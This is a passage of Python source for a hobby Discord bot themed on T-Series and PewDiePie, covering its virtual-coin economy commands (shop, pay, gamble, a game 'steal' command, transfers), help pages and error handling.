        await bot.pool.execute("UPDATE econ SET coins = coins - $1 WHERE userid = $2 AND guildid = $3;", req_amount, ctx.author.id, ctx.guild.id);
        # Tell the user
        em = discord.Embed(color = discord.Color.dark_red());
        em.add_field(name = "Purchased Role", value = f"{ctx.author.mention} bought the `{role.name}` role costing {req_amount:,d} {tcoinimage}");
        em.timestamp = datetime.datetime.utcnow();
        await ctx.send(embed = em);
    else:
        # User does not have enough
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Not Enough", value = f"""
        You need {req_amount - user_amount:,d} more {tcoinimage} to buy the `{role.name}` role.
        """);
        await ctx.send(embed = em);

# SHOP: Edit existing shop item (REQ_MANAGE_ROLES)
@shop.command(aliases = ["change", "adjust"])
@commands.has_permissions(manage_roles = True)
async def edit(ctx, req_amount: int, *, role: discord.Role):
    # Check if the role does NOT exist
    rolecheck = await bot.pool.fetchrow("SELECT * FROM econshop WHERE roleid = $1 AND guildid = $2;", role.id, ctx.guild.id);
    if rolecheck == None:
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Role Not Found", value = "This role could not be found in the shop. You can create on using the `shop add` command");
        await ctx.send(embed = em);
        return;
    # Check if amount is less than or equal to 0
    if 0 >= req_amount:
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Too Small", value = f"You cannot set the amount at 0 or below");
        await ctx.send(embed = em);
        return;
    # Edit the role
    await bot.pool.execute("UPDATE econshop SET reqamount = $1 WHERE roleid = $2 AND guildid = $3;", req_amount, role.id, ctx.guild.id);
    # Tell the user
    em = discord.Embed(color = discord.Color.dark_red());
    em.add_field(name = "Role Updated", value = f"`{role.name}`'s required amount to purchase has been changed to {req_amount:,d} {tcoinimage}");
    await ctx.send(embed = em);

# SHOP: Delete existing shop item (REQ_MANAGE_ROLES)
@shop.command(aliases = ["remove"])
@commands.has_permissions(manage_roles = True)
async def delete(ctx, *, role: discord.Role):
    # Check if the role does NOT exist
    rolecheck = await bot.pool.fetchrow("SELECT * FROM econshop WHERE roleid = $1 AND guildid = $2;", role.id, ctx.guild.id);
    if rolecheck == None:
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Role Not Found", value = "This role could not be found in the shop. You can create on using the `shop add` command");
        await ctx.send(embed = em);
        return;
    # Delete role from the DB
    await bot.pool.execute("DELETE FROM econshop WHERE roleid = $1 AND guildid = $2;", role.id, ctx.guild.id);
    # Tell the user
    em = discord.Embed(color = discord.Color.dark_red());
    em.add_field(name = "Role Deleted", value = f"`{role.name}` has been removed from the shop");
    await ctx.send(embed = em);

# ====ECONOMY SHOP END====

# Amount or all
class AmountConverter(commands.Converter):
    async def convert(self, ctx, argument):
        try:
            return int(argument);
        except:
            pass;
        if "all" in argument:
            # Get users coins
            coins = await bot.pool.fetchval("SELECT coins FROM econ WHERE userid = $1 AND guildid = $2;", ctx.author.id, ctx.guild.id);
            return coins;
        elif "," in argument:
            return int(argument.replace(",", ""));
        else:
            return 0;

# Pay command
@bot.command(aliases = ["give", "givemoney", "send", "sendmoney", "add", "addmoney"])
@commands.check(cad_user)
async def pay(ctx, amount: AmountConverter, *, user: discord.Member):
    # Check if the amount is negative
    if 0 >= amount:
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Too Small", value = f"You cannot send {tcoinimage} that is 0 or smaller");
        await ctx.send(embed = em);
        return;
    # Check if the user has enough money
    aucash = await bot.pool.fetchval("SELECT coins FROM econ WHERE userid = $1 AND guildid = $2;", ctx.author.id, ctx.guild.id);
    if aucash >= amount:
        # Check if recipient is in the DB
        repcheck = await bot.pool.fetchrow("SELECT * FROM econ WHERE userid = $1 AND guildid = $2;", user.id, ctx.guild.id);
        if repcheck == None:
            # If they're not, add them
            await bot.pool.execute("INSERT INTO econ VALUES ($1, $2, $3);", 0, user.id, ctx.guild.id);
        # Update value for recipient
        await bot.pool.execute("UPDATE econ SET coins = coins + $1 WHERE userid = $2 AND guildid = $3;", amount, user.id, ctx.guild.id);
        # Update values for sender
        await bot.pool.execute("UPDATE econ SET coins = coins - $1 WHERE userid = $2 AND guildid = $3;", amount, ctx.author.id, ctx.guild.id);
        # Tell the user
        em = discord.Embed(color = discord.Color.dark_green());
        em.add_field(name = f"Sent T-Coin to {user.name}#{user.discriminator}", value = f"{amount:,d} {tcoinimage} was sent to {user.mention}");
        em.timestamp = datetime.datetime.utcnow();
        await ctx.send(embed = em);
    else:
        # They do not have enough
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Not Enough", value = f"You do not have enough {tcoinimage} to send {amount:,d}");
        await ctx.send(embed = em);

# Balance command
@bot.command(aliases = ["bal", "money", "cash", "$", "coins", "coin", "bank"])
async def balance(ctx, *, user: discord.Member = None):
    # Get user balance
    if user != None:
        uid = user;
    else:
        uid = ctx.author;
    bal = await bot.pool.fetchval("SELECT coins FROM econ WHERE userid = $1 AND guildid = $2;", uid.id, ctx.guild.id);
    if bal == None:
        bal = 0;
    # Tell the user
    em = discord.Embed(color = discord.Color.blue());
    em.set_author(name = f"{uid.name}#{uid.discriminator}", icon_url = uid.avatar_url);
    em.add_field(name = "T-Coins", value = f"{bal:,d} {tcoinimage}");
    await ctx.send(embed = em);

# Leaderboard
@bot.command(aliases = ["lb", "lead", "board", "leadboard"])
async def leaderboard(ctx):
    # Get coins by order
    coins = await bot.pool.fetch("SELECT * FROM econ ORDER BY coins DESC LIMIT 5;");
    # Make embed
    em = discord.Embed(color = discord.Color.dark_red());
    # Make sure something is in the embed
    if coins == []:
        em.add_field(name = "Leaderboard", value = "No one is using T-Coin so there is nothing on the leaderboard :(");
    else:
        em.set_author(name = "Leaderboard");
    # Loop
    lbcount = 0;
    for x in coins:
        lbcount += 1;
        try:
            uname = bot.get_user(x["userid"]).name;
            gname = bot.get_guild(x["guildid"]).name;
        except AttributeError:
            uname = "User Not Found";
            gname = "Guild Not Found";
        # Check if names are too big
        if len(uname) > 17:
            uname = uname[:-5] + "...";
        if len(gname) > 20:
            gname = gname[:-7] + "...";
        # Put coins in a human readable format
        coins = format(x["coins"], ",d");
        # Add field to embed
        em.add_field(name = f"#{lbcount} - {uname} ({gname})", value = f"T-Coins: {coins} {tcoinimage}", inline = False);
    # Set footer
    em.set_footer(text = "PROTIP: Use t.shovel to collect T-Coins");
    # Send
    await ctx.send(embed = em);

# Gamble command
@bot.command(aliases = ["bet", "ontheline", "bets", "dice", "die"])
@commands.check(cad_user)
@commands.cooldown(1, 60, commands.BucketType.member)
async def gamble(ctx, amount: AmountConverter):
    # Get user stuff
    usercoins = await bot.pool.fetchval("SELECT coins FROM econ WHERE userid = $1 AND guildid = $2;", ctx.author.id, ctx.guild.id);
    # Check if the user is using negatives
    if 0 >= amount:
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Too Small", value = f"You cannot gamble {tcoinimage} that is 0 or smaller");
        await ctx.send(embed = em);
        bot.get_command("gamble").reset_cooldown(ctx);
        return;
    # See if they have enough coins
    if usercoins >= amount:
        # Gamble (all or nothing)
        choice = random.choice([True, False, False, False, False]);
        if choice:
            cm = "Gained";
        else:
            cm = "Lost";
            amount = -amount;
        # Update coins
        await bot.pool.execute("UPDATE econ SET coins = coins + $1 WHERE userid = $2 AND guildid = $3;", amount, ctx.author.id, ctx.guild.id);
        # Tell user
        em = discord.Embed(color = discord.Color.dark_red());
        em.add_field(name = f"You {cm} Coins", value = f"You have {cm.lower()} {amount:,d} {tcoinimage} from the gamble");
        await ctx.send(embed = em);
    else:
        # User does not have enough coins
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Not Enough", value = f"You do not have {amount:,d} {tcoinimage} to gamble");
        await ctx.send(embed = em);
        # Reset cooldown
        bot.get_command("gamble").reset_cooldown(ctx);

# Steal command
@bot.command(aliases = ["rob", "take", "thief", "steel", "theft", "thieves"])
@commands.check(cad_user)
@commands.cooldown(1, 7200, commands.BucketType.member)
async def steal(ctx, *, user: discord.Member):
    # Check if the user is themselves
    if user.id == ctx.author.id:
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Cannot Steal", value = "You cannot steal from yourself");
        await ctx.send(embed = em);
        # Reset cooldown
        bot.get_command("steal").reset_cooldown(ctx);
        # Return
        return;
    # Get mentioned users coins
    mu = await bot.pool.fetchval("SELECT coins FROM econ WHERE userid = $1 AND guildid = $2;", user.id, ctx.guild.id);
    if mu == None:
        mu = 0;
    # Create chance of actually getting coins from them
    coinchance = random.choice([True, False, True, True, False, False]);
    if coinchance:
        # Random number for negative
        giveper = random.randint(1, 5);
        # Calculate how much to give
        give = round(mu * float(f"0.0{giveper}"));
        # Check if the amount is negative
        if 0 >= give:
            em = discord.Embed(color = discord.Color.dark_teal());
            em.add_field(name = "Not Enough", value = f"{user.mention} does not have enough coins to steal from");
            await ctx.send(embed = em);
            # Reset cooldown
            bot.get_command("steal").reset_cooldown(ctx);
            # Return
            return;
        # Remove coins from mentioned user
        await bot.pool.execute("UPDATE econ SET coins = coins - $1 WHERE userid = $2 AND guildid = $3;", give, user.id, ctx.guild.id);
        # Add coins to author
        await bot.pool.execute("UPDATE econ SET coins = coins + $1 WHERE userid = $2 AND guildid = $3;", give, ctx.author.id, ctx.guild.id);
        # Tell the user
        em = discord.Embed(color = discord.Color.dark_red());
        em.add_field(name = f"Stole from {user.name}", value = f"You stole {give:,d} {tcoinimage} from {user.mention}");
        em.timestamp = datetime.datetime.utcnow();
        await ctx.send(embed = em);
    else:
        em = discord.Embed(color = discord.Color.dark_red());
        em.add_field(name = "Caught by the Police", value = f"Looks like this time {user.mention} got off the hook since the police showed up");
        await ctx.send(embed = em);

# Guild T-Coin transfer command
@bot.command()
@commands.check(cad_user)
async def transfer(ctx, amount: AmountConverter, *, guild: str):
    # Check if amount is 0 or below
    if 0 >= amount:
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Too Small", value = f"You cannot transfer {tcoinimage} that is 0 or smaller");
        await ctx.send(embed = em);
        return;
    # Check for guild
    guild = discord.utils.get(bot.guilds, name = guild);
    # Guild Not Found
    if guild == None:
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Guild Not Found", value = f"{bot.user.name} could not find the guild");
        await ctx.send(embed = em);
        return;
    # Transferred already
    transfercheck = await bot.pool.fetchval("SELECT transfer FROM econ WHERE userid = $1 AND guildid = $2;", ctx.author.id, ctx.guild.id);
    if transfercheck:
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Already Transferred", value = "You have already transferred your T-Coins to this guild");
        await ctx.send(embed = em);
        return;
    # Get user coins
    coins = await bot.pool.fetchval("SELECT coins FROM econ WHERE userid = $1 AND guildid = $2;", ctx.author.id, ctx.guild.id);
    # Calculate 50% of users coins
    coins = round(coins * 0.5);
    # Check if the user has enough coins
    if coins >= amount:
        # User has enough coins
        # Check if the user is already in the DB for the guild
        gc = await bot.pool.fetchrow("SELECT * FROM econ WHERE userid = $1 AND guildid = $2;", ctx.author.id, guild.id);
        if gc == None:
            # Add
            await bot.pool.execute("INSERT INTO econ VALUES ($1, $2, $3);", amount, ctx.author.id, guild.id);
        else:
            # Update
            await bot.pool.execute("UPDATE econ SET coins = coins + $1 WHERE userid = $2 AND guildid = $3;", amount, ctx.author.id, guild.id);
        # Set transfer as true
        await bot.pool.execute("UPDATE econ SET transfer = true WHERE userid = $1 AND guildid = $2;", ctx.author.id, ctx.guild.id);
        # Remove coins from the user which this command is being invoked in
        await bot.pool.execute("UPDATE econ SET coins = coins - $1 WHERE userid = $2 AND guildid = $3;", amount, ctx.author.id, ctx.guild.id);
        # Tell the user
        em = discord.Embed(color = discord.Color.dark_red());
        em.add_field(name = "T-Coins Transferred", value = f"{amount:,d} {tcoinimage} has been transferred to `{guild.name}`");
        em.timestamp = datetime.datetime.utcnow();
        await ctx.send(embed = em);
    else:
        # User does not have enough coins
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Not Enough", value = f"You do not have enough T-Coins to transfer {amount:,d} {tcoinimage} to `{guild.name}`");
        em.set_footer(text = "NOTE: You are only able to transfer up to 50% of your T-Coins");
        await ctx.send(embed = em);

# Add T-Coins command (REQ_BOT_OWNER)
@bot.command()
@commands.is_owner()
async def addcoins(ctx, amount: AmountConverter, *, user: discord.Member):
    # Check if the amount specified is too small
    if 0 >= amount:
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Too Small", value = f"You cannot add T-Coins to users that is 0 or smaller");
        await ctx.send(embed = em);
        return;
    # Check if the user is in the DB
    usercheck = await bot.pool.fetchrow("SELECT * FROM econ WHERE userid = $1 AND guildid = $2;", user.id, ctx.guild.id);
    if usercheck == None:
        # Add user (INSERT)
        await bot.pool.execute("INSERT INTO econ VALUES ($1, $2, $3);", amount, user.id, ctx.guild.id);
    else:
        # Add user (UPDATE)
        await bot.pool.execute("UPDATE econ SET coins = coins + $1 WHERE userid = $2 AND guildid = $3;", amount, user.id, ctx.guild.id);
    # Tell user
    em = discord.Embed(color = discord.Color.dark_red());
    em.add_field(name = "Coins Added", value = f"{amount:,d} {tcoinimage} has been added to {user.mention}");
    em.timestamp = datetime.datetime.utcnow();
    await ctx.send(embed = em);

# Remove T-Coins command (REQ_BOT_OWNER)
@bot.command()
@commands.is_owner()
async def removecoins(ctx, amount: AmountConverter, *, user: discord.Member):
    # Check if the amount specified is too small
    if 0 >= amount:
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Too Small", value = f"You cannot remove T-Coins to users that is 0 or smaller");
        await ctx.send(embed = em);
        return;
    # Check if the user is in the DB
    usercheck = await bot.pool.fetchrow("SELECT * FROM econ WHERE userid = $1 AND guildid = $2;", user.id, ctx.guild.id);
    if usercheck == None:
        # Remove user (INSERT)
        await bot.pool.execute("INSERT INTO econ VALUES ($1, $2, $3);", -amount, user.id, ctx.guild.id);
    else:
        # Remove user (UPDATE)
        await bot.pool.execute("UPDATE econ SET coins = coins + $1 WHERE userid = $2 AND guildid = $3;", -amount, user.id, ctx.guild.id);
    # Tell user
    em = discord.Embed(color = discord.Color.dark_red());
    em.add_field(name = "Coins Removed", value = f"{amount:,d} {tcoinimage} has been removed from {user.mention}");
    em.timestamp = datetime.datetime.utcnow();
    await ctx.send(embed = em);

# ====ECONOMY COMMANDS END====

# Help command
@bot.group(invoke_without_command = True)
async def help(ctx):
    em = discord.Embed(color = discord.Color.gold());
    em.set_author(name = "T-Series Help Page");
    # Main commands
    em.add_field(name = "Main Commands", value = """
    `pewdiepie`: Tells you what I think of PewDiePie in Hindi
    `disstrack`: Plays Bitch Lasagna in a voice channel. To disconnect, run `ts!disstrack stop` or `ts!disstrack leave`
    `subcount`: Shows T-Series' and PewDiePie's subscriber count
    `subgap`: Automatically updates the current subscriber gap between PewDiePie and T-Series every 30 seconds. Your server must be authorized to use this feature.
    Please join the [support server](https://discord.gg/we4DQ5u) to request authorization.
    `randomvid`: Returns a random PewDiePie or T-Series video
    `youtube (yt)`: Sends you the link to PewDiePie's and T-Series' YouTube channel
    """, inline = False);
    # T-Coin (economy) commands
    em.add_field(name = "T-Coin (economy)", value = """
    Run `t.help economy` to view the list of commands for T-Coin (economy commands)
    """);
    # Meta commands
    em.add_field(name = "Meta Commands", value = f"""
    `botinfo`: Information on {bot.user.name}
    `invite`: Sends the bot invite
    `feedback`: This command will send the developer feedback on this bot. Feel free to send suggestions or issues
    `prefixtut`: This will give you a tutorial on how to use custom prefixes on {bot.user.name}
    `prefix`: Returns the current prefix that {bot.user.name} uses in your server
    """, inline = False);
    # Timestamp
    em.timestamp = datetime.datetime.utcnow();
    em.set_footer(icon_url = ctx.author.avatar_url, text = f"{ctx.author.name}#{ctx.author.discriminator}");
    await ctx.send(embed = em);

# Help: economy
@help.command(aliases = ["tcoin", "t-coin", "tcoins", "t-coins"])
async def economy(ctx):
    em = discord.Embed(color = discord.Color.gold());
    em.set_author(name = "T-Series Economy Help Page");
    em.add_field(name = "T-Coin Commands", value = """
    `shovel`: You work all day shoveling for T-Coins
    `balance (bal)`: Informs you on how many T-Coins you have
    `pay`: Pays a user with a specified amount of T-Coins
    `leaderboard (lb)`: Shows the leaderboard for T-Coins
    `gamble`: You can gamble a specific amount of T-Coins
    `steal (rob)`: Steals from a user that you specify
    `transfer`: Sends T-Coins to another server. The max amount is 50% of your coins.
    """, inline = False);
    em.add_field(name = "Shop", value = """
    `shop`: View all the items (roles) in the shop
    `shop add`: Adds a role to the shop (you must have the manage roles permission)
    `shop edit`: Edits a role (eg. changes the cost) in the shop (manage roles permission required by user)
    `shop delete (remove)`: Removes a role from the shop (manage roles permission required by user)
    `shop buy`: Buys an item from the shop (you must have enough coins)
    **Please note: The bot must have the manage roles permission and be higher than the role in the shop to use the shop feature**
    """, inline = False);
    await ctx.send(embed = em);

# Error handlers

@bot.event
async def on_command_error(ctx, error):
    # Check if error is from a subgap channel
    check = await subgapchck(ctx.channel.id);
    if check:
        errorchannel = bot.get_channel(519378596104765442);
        em = discord.Embed(title = "Subgap Channel Error", color = discord.Color.dark_teal());
        em.set_thumbnail(url = ctx.guild.icon_url);
        em.add_field(name = "Guild ID", value = str(ctx.guild.id));
        em.add_field(name = "Guild Name", value = ctx.guild.name);
        em.add_field(name = "Error", value = f"`{error}`", inline = False);
        em.add_field(name = "Channel ID", value = str(ctx.channel.id));
        em.add_field(name = "Channel Name", value = ctx.channel.name);
        em.add_field(name = "Channel Mention", value = ctx.channel.mention);
        # Timestamp
        em.timestamp = datetime.datetime.utcnow();
        # Send
        await errorchannel.send(embed = em);
        # Return
        return;
    else:
        pass;
    if isinstance(error, commands.CommandOnCooldown) == False:
        # Reset cooldown if there is one
        try:
            bot.get_command(ctx.command.name).reset_cooldown(ctx);
        except AttributeError:
            pass;
    if isinstance(error, commands.CommandNotFound):
        return;
    elif isinstance(error, commands.MissingPermissions):
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Error: Missing Permissions", value = "You do not have the necessary permissions to run this command");
        await ctx.send(embed = em);
    elif isinstance(error, commands.BotMissingPermissions):
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Error: Bot Missing Permissions", value = f"{bot.user.name} does not have permissions to execute this command");
        await ctx.send(embed = em);
    elif isinstance(error, discord.HTTPException):
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Error: HTTP Exception", value = "There was an error connecting to Discord. Please try again");
        await ctx.send(embed = em);
    elif isinstance(error, commands.CommandInvokeError):
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Error: Command Invoke Error", value = f"There was an issue running the command.\nError: `{error}`");
        await ctx.send(embed = em);
    elif isinstance(error, commands.MissingRequiredArgument):
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Error: Missing Argument", value = f"""
        I'm missing a parameter, specifically `{error.param}`. Please make sure you entered the command in correctly then try again.
        """);
        await ctx.send(embed = em);
    elif isinstance(error, commands.NotOwner):
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Error: Not Owner", value = "You do not have permission to run this command because you are not the owner");
        await ctx.send(embed = em);
    elif isinstance(error, commands.CommandOnCooldown):
        # Time
        seconds = int(error.retry_after);
        seconds = round(seconds, 2);
        hours, remainder = divmod(int(seconds), 3600);
        minutes, seconds = divmod(remainder, 60);
        # Timing wording
        if hours > 1:
            hours = f"{hours} hours";
        elif hours == 1:
            hours = f"{hours} hour";
        else:
            hours = "";
        if minutes > 1:
            minutes = f"{minutes} minutes";
        elif minutes == 1:
            minutes = f"{minutes} minute";
        else:
            minutes = "";
        if seconds > 1:
            seconds = f"{seconds} seconds";
        elif seconds == 1:
            seconds = f"{seconds} second";
        else:
            seconds = "";
        # Ist
        if hours != "":
            ist = "and";
        else:
            ist = "";
        if seconds != "":
            if minutes != "":
                ist1 = "and";
            else:
                ist1 = "";
        else:
            ist1 = "";
        # Send embed
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Error: Cooldown", value = f"Please wait {hours} {ist} {minutes} {ist1} {seconds} to use `{ctx.command.name}` again");
        await ctx.send(embed = em);
    else:
        em = discord.Embed(color = discord.Color.dark_teal());
        em.add_field(name = "Unknown Error", value = f"An unexpected error occurred.\nError: `{error}`");
        await ctx.send(embed = em);

# Log on command completion
@bot.event
async def on_command_completion(ctx):
    print();
    print(f"COMPLETED COMMAND: {ctx.command.name}. Invoked by: {ctx.author.name}#{ctx.author.discriminator}");
    print(f"GUILD: {ctx.guild.name} | GUILD ID: {ctx.guild.id} | USER ID: {ctx.author.id}");

# Create background task for database
bot.loop.create_task(postgresbkg());
# Load in jishaku
bot.load_extension("jishaku");
# Support server authorization
bot.load_extension("authsupport");
# Run bot with token
bot.run(config.pubtoken);